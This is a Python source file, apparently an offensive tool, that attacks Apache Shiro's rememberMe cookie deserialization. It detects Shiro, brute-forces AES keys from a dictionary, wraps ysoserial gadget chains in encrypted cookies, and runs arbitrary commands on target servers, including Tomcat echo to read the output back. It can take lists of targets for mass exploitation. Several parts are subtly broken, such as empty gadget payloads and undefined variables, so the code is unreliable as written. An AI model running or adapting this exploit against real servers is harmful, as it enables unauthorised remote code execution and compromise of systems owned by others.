class RandomString:
    def __init__(self, min_length, max_length) -> None:
        self.min_length = min_length
        self.max_length = max_length

    def __call__(self):
        random_length = random.randint(self.min_length, self.max_length)
        random_str = ''
        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz'
        __length = len(base_str) - 1
        for _ in range(random_length):
            random_str += base_str[random.randint(0, __length)]
        return random_str

class Payload:
    check_data = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
    file_body = base64.b64decode(check_data)

    def __init__(self, key) -> str:
        self.key = key

    def gcm_encrypt(self, file_body=None):
        file_body         = self.file_body if file_body == None else file_body
        iv                = os.urandom(16)
        cipher            = AES.new(base64.b64decode(self.key), AES.MODE_GCM, iv)          
        ciphertext, tag   = cipher.encrypt_and_digest(file_body)
        ciphertext        = ciphertext + tag
        base64_ciphertext = base64.b64encode(iv + ciphertext)
        return base64_ciphertext

    def cbc_encrypt(self, file_body=None):
        file_body         = self.file_body if file_body == None else file_body
        bs                = AES.block_size
        pad               = lambda s: s + ((bs - len(s) % bs) * chr(bs - len(s) % bs)).encode()
        mode              = AES.MODE_CBC
        iv                = uuid.uuid4().bytes
        paded_file_body   = pad(file_body)
        encryptor         = AES.new(base64.b64decode(self.key), mode, iv)
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(paded_file_body))
        return base64_ciphertext

class Command:
    def __init__(self, mode, url, type, key, data, proxies, command, gadget, ser):
        self.mode    = mode
        self.url     = url
        self.type    = type
        self.key     = key
        self.data    = data
        self.proxies = proxies
        self.command = command
        self.gadget  = gadget
        self.ser     = ser

class CheckShiro(Command):
    __random_str = RandomString(5, 10).__call__()

    def __init__(self, mode, url, type, key, data, proxies, command, gadget, ser):
        super().__init__(mode, url, type, key, data, proxies, command, gadget, ser)

    def check_shiro(self):
        __header = {"User-Agent":Factory.create().user_agent(), "Connection":"close"}
        try:
            request = requests.get(url=self.url, timeout=10, proxies=self.proxies,
                                    verify=False, headers=__header, allow_redirects=False)
            if request.raise_for_status() != None:
                print("[!] {} redirected or inaccessible!".format(self.url))
                print("[!] The status code : {}".format(str(request.status_code)))
                alive_url = None
                exit()
            else:
                alive_url = self.url
        except requests.exceptions.ConnectionError as e:
            alive_url = None
            print("[!] The target URL : {} can't connect!\n".format(self.url))
            return None
            # print("\r\n{}\r\n".format(e))

        if alive_url == None:
            pass
        elif self.data:
            try:
                request = requests.post(url=alive_url, cookies={'rememberMe': self.__random_str}, timeout=10, proxies=self.proxies,
                                        verify=False, headers=__header, allow_redirects=False, data=self.data)
                res_length = len(str(request.headers))
            except requests.exceptions.Timeout as e:
                print("[!] {} read time out!".format(alive_url))
                return
            if "rememberMe" in str(request.headers):
                print("[*] Shiro framework exists for {} !".format(self.url))
                return res_length
            else:
                print(
                    "[!] The Shiro framework may not exist for {},maybe you can remove '--data'/'-d' argument and try again \n".format(self.url))
        else:
            request = requests.get(url=alive_url, cookies={'rememberMe': self.__random_str}, timeout=10, proxies=self.proxies,
                                    verify=False, headers=__header, allow_redirects=False)
            res_length = len(str(request.headers))

            if "rememberMe" in str(request.headers):
                print("[*] Shiro framework exists for {} !".format(self.url))
                return res_length
            else:
                print("[!] The Shiro framework may not exist for {},maybe you can add '--data'/'-d' argument and try again \n".format(self.url))

class VerifyKey(Command):
    def __init__(self, mode, url, type, key, data, proxies, command, gadget, ser):
        super().__init__(mode, url, type, key, data, proxies, command, gadget, ser)

    def crack(self):
        __header = {"User-Agent":Factory.create().user_agent(), "Connection":"close"}
        res_length = CheckShiro(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).check_shiro()

        if res_length == None:
            return

        if self.key == None:
            with open(os.path.join(sys.path[0], './lib/shiro_keys.txt'),'r') as fr:
                keys = fr.read().splitlines()
            for i in range(len(keys)):
                print("[*] You didn't specify a shiro key. Start crack mode!")
                if self.type == 'CBC':
                    payload = Payload(keys[i]).cbc_encrypt().decode()
                elif self.type == 'GCM':
                    payload = Payload(keys[i]).gcm_encrypt().decode()

                if self.data == None:
                    r = requests.get(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                    verify=False, headers=__header, allow_redirects=False,data=data)
                    rsp = len(str(r.headers))
                else:
                    r = requests.post(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                    verify=False, headers=__header, allow_redirects=False,data=data)
                    rsp = len(str(r.headers))

                if res_length != rsp and r.status_code != 400:
                    print("[*] The correct key : {0}".format(keys[i]))
                    print("[*] The payload : {0}\n".format(payload))
                    return keys[i]
                else:
                    print("[!] The shiro key of {} cracking failed!".format(self.url))
                    return False

        else:
            print("[*] Start checking the shiro key : {}".format(self.key))
            if self.type == 'CBC':
                payload = Payload(self.key).cbc_encrypt().decode()
            elif self.type == 'GCM':
                payload = Payload(self.key).gcm_encrypt().decode()
            if self.data == None:
                r = requests.get(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                    verify=False, headers=__header, allow_redirects=False,data=data)
                rsp = len(str(r.headers))
            else:
                r = requests.post(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                    verify=False, headers=__header, allow_redirects=False,data=data)
                rsp = len(str(r.headers))

        if res_length != rsp and r.status_code != 400:
                print("[*] The correct key : {0}".format(self.key))
                print("[*] The payload : {0}".format(payload))
                return self.key
        else:
            print("[!] The shiro key you specified is incorrect!")
            return False

class Exploit(Command):
    def __init__(self, mode, url, type, key, data, proxies, command, gadget, ser):
        super().__init__(mode, url, type, key, data, proxies, command, gadget, ser)
        self.key =  VerifyKey(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).crack()

    def tomcat_echo(self):
        if self.key == None:
            return

        tomcatEchoPayload={"CommonsCollectionsK1":"",
                        "CommonsCollectionsK2":"",
                        "CommonsBeanutils1":"",
                        "CommonsBeanutils2":"",
                        "Jdk7u21":"",
                        "Jdk8u20":""}

        if gadget in tomcatEchoPayload:
            checker = str(uuid.uuid1())
            payload_command = self.command + " && echo " + checker if self.command else "whoami"+ " && echo "+ checker

            headers = {"User-Agent":Factory.create().user_agent(),
                        "Connection":"close",
                        "Testecho":checker,
                        "Testcmd":payload_command}

            if type == "GCM":
                payload = Payload(self.key).gcm_encrypt(base64.b64decode(tomcatEchoPayload[gadget])).decode()
            else:
                payload = Payload(self.key).cbc_encrypt(base64.b64decode(tomcatEchoPayload[gadget])).decode()

            cookie = {"rememberMe":payload}
            rsp = requests.get(self.url, headers=headers, cookies=cookie, verify=False, stream=True)
            if rsp.headers["Testecho"] == checker:
                print ("[*] Tomcat echo Exploit success")
                regex=re.compile(r'((?:.|\n)*){0}'.format(checker))
                for i in rsp.iter_content(chunk_size=102400):
                    if checker in str(i.decode()):
                        print (i.decode().replace(checker,""))
                        break
                    elif regex.findall(rsp.text) == []:
                        print ("[!] Get result faild!")
                        print ("[!] Exploit Manual: ")
                        print ("Testcmd: {}".format(self.command))
                        print("Testecho: {}".format(checker))
                        print ("Cookie: rememberMe={}\n".format(payload))
                        break
                    else:
                        print(regex.findall(rsp.text)[0])
                        break
        else:
            print("[!] Gadget Not Support")

    def ysoserial_call(self):
        if self.key == None:
            return

        popen = subprocess.Popen(['java', '-jar', os.path.join(sys.path[0], "ysoserial.jar"), self.gadget, self.command], stdout=subprocess.PIPE)

        if "Y SO SERIAL?" in popen.stderr.read().decode():
            print("[!] Gadget not sport!\n")
            return

        file_body = base64.b64encode(popen.stdout.read())

        if self.type == 'CBC':
            payload = Payload(self.key).cbc_encrypt(file_body).decode()
        else:
            payload = Payload(self.key).gcm_encrypt(file_body).decode()

        headers = {"User-Agent":Factory.create().user_agent(),
                    "Connection":"close",}
        cookies = {"rememberMe":payload}

        if self.data != None:
            r = requests.post(url=self.url, headers=headers, cookies=cookies, verify=False, data=self.data)
        else:
            r = requests.get(url=self.url, headers=headers, cookies=cookies, verify=False)
        try:
            print("[*] Send over : {}\n".format(r.status_code))
        except Exception as e:
            print("[*] URL: {0}Error!\n{1}".format(self.url, e))
            print("[*] Exploit Manual: ")
            print("Cookie: rememberMe={0}".format(payload.decode()))

    def ser_encode(self):
        with open(os.path.join(sys.path[0], self.ser),'rb') as fr:
            ser = fr.read()

        if self.type == "CBC":
            payload = Payload(self.key).cbc_encrypt(ser).decode()
        else:
            payload = Payload(self.key).gcm_encrypt(ser).decode()

        print("[*] Payload generation complete!")
        print(payload)

class CommandFactory(Command):
    def __init__(self, mode, url, type, key, data, proxies, command, gadget, ser):
        super().__init__(mode, url, type, key, data, proxies, command, gadget, ser)

    def run(self):
        print('*' * 100)
        if "http://" in self.url or "https://" in self.url:
            _type = 'url'
        else:
            _type = 'file'

        if self.mode == 'check' and  _type == 'url':
            CheckShiro(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).check_shiro()

        elif self.mode == 'check' and _type == 'file':
            with open(os.path.join(sys.path[0], self.url),'r') as fr:
                urls = fr.read().splitlines()
            for self.url in urls:
                CheckShiro(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).check_shiro()

        elif self.mode == "crack" and _type =='url':
            VerifyKey(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).crack()

        elif self.mode == "crack" and _type =='file':
            with open(os.path.join(sys.path[0], self.url),'r') as fr:
                urls = fr.read().splitlines()
            for self.url in urls:
                VerifyKey(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).crack()

        elif self.mode == "echo" and _type == 'url':
            Exploit(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).tomcat_echo()

        elif self.mode == "echo" and _type == 'file':
            with open(os.path.join(sys.path[0], self.url),'r') as fr:
                urls = fr.read().splitlines()
            for self.url in urls:
                Exploit(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).tomcat_echo()

        elif self.mode =="yso" and self.gadget == None:
            print("[!] Specific Ysoserial Gadget!")
            subprocess.Popen(['java', '-jar', os.path.join(sys.path[0], "ysoserial.jar")], stdout=subprocess.PIPE)

        elif self.mode == "yso" and _type == 'url':
            Exploit(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).ysoserial_call()

        elif self.mode == "yso" and _type == 'file':
            with open(os.path.join(sys.path[0], self.url),'r') as fr:
                urls = fr.read().splitlines()
            for self.url in urls:
                Exploit(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).ysoserial_call()

        elif self.mode == "encode" and self.ser != None:
            Exploit(self.mode, self.url, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser, self.ser).ser_encode()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="This is a simple tool to attack framework shiro with ysoserial")
    parser.add_argument('--mode', '-m', type=str, required=True, help='check/crack/yso/echo/encode')
    parser.add_argument('--url', '-u', type=str, metavar='', required=True, help='Target URL address or the file containing the target URL')
    parser.add_argument('--type', '-t', type=str, metavar='', default="CBC", help='Cipher Type, GCM or CBC')
    parser.add_argument('--data', '-d', type=str, metavar='', default=None, help='Using this parameter will make HTTP request with POST method')
    parser.add_argument('--key', '-k', type=str, metavar='', default=None, help='Specify a Shiro Key or will use dictionary brute force cracking')
    parser.add_argument('--gadget', '-g', type=str, metavar='', default=None, help='Specific Ysoserial Gadget')
    parser.add_argument('--command', '-c', type=str, metavar='', default='whoami', help='Specific Execute Command')
    parser.add_argument('--proxies', '-p', type=str, metavar='', default={}, help='Specific Proxy')
    parser.add_argument('--ser','-s', type=str, metavar='', default=None, help='Specific serialize file name')
    args = parser.parse_args()

    mode    = str.lower(args.mode)
    url     = args.url
    type    = str.upper(args.type)
    data    = args.data
    key     = args.key
    gadget  = args.gadget
    command = args.command
    ser     = args.ser
    proxies = {args.proxies.split("://",1)[0]:"{0}{1}{2}".format(args.proxies.split("://",1)[0], "://", args.proxies.split("://",1)[1])} if isinstance(args.proxies, str) else {}

    cmd = CommandFactory(mode, url, type, key, data, proxies, command, gadget, ser)
    cmd.run()
